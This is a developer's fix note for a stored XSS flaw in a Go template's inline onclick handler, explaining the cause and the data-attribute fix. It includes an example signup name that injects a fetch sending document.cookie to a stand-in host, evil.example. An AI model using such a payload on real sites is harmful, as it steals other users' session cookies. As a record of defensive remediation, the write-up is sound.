# Notable Fixes

## XSS via inline onclick in host_queue.html

**Date:** 2026-05-10

### What was wrong

`host_queue.html` rendered the remove button like this:

```html
<button class="remove-btn" onclick="openRemoveDialog('{{$e.Name}}')">Remove</button>
```

Go's `html/template` auto-escapes values in HTML context — tags, attributes, text nodes. But
`onclick` is a **JavaScript context**. The template engine treated it as an attribute value and
HTML-escaped it (turning `<` into `&lt;`, etc.), but it did **not** JS-escape it. Single quotes
and semicolons passed through unmodified.

An audience member could sign up with a name like:

```
'); fetch('https://evil.example/steal?c='+document.cookie); ('
```

Which would render as:

```html
<button onclick="openRemoveDialog(''); fetch('https://evil.example/steal?c='+document.cookie); ('')">
```

When the host opened the queue, that button rendered in their browser and the injected script
executed. This is a stored XSS: the payload is written to the database at signup time and
triggered later when the host views the queue.

### The fix

Moved the name out of JS entirely and into a `data-` attribute, which is pure HTML context
and fully escaped by the template engine:

```html
<button class="remove-btn" data-name="{{$e.Name}}">Remove</button>
```

Then read it in `host.js` via event delegation on the queue container (which survives HTMX
innerHTML swaps):

```js
queueList.addEventListener('click', function(e) {
    if (e.target.closest('.remove-btn')) {
        openRemoveDialog(e.target.closest('.remove-btn').dataset.name);
    }
});
```

`openRemoveDialog` already used `.textContent` to set the name in the dialog, so that side
was already safe. The fix is entirely about how the name is passed to the function.

### Why this context matters

The host view is authenticated, so an attacker can't reach it directly. But any audience
member can sign up with an arbitrary name, which is stored in the DB and later rendered in
the host view. The host is the target, not the public user.